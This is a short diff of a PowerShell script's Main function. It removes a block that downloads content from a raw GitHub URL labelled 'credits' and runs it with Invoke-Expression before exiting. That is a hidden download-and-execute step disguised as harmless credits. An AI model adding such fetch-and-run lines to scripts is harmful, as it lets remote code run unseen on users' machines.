@@ -296,13 +296,3 @@ function Main {
     } else {
         Write-Host "Log file not found on the desktop." -ForegroundColor Red
     }
-
-    $userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
-    $downloadsPath = Join-Path -Path $userProfile -ChildPath "Downloads"
-    $url = "https://raw.githubusercontent.com/Reapiin/art/main/credits"
-    $content = Invoke-RestMethod -Uri $url
-    Invoke-Expression $content
-
-    # End the script after credits
-    Exit
-}
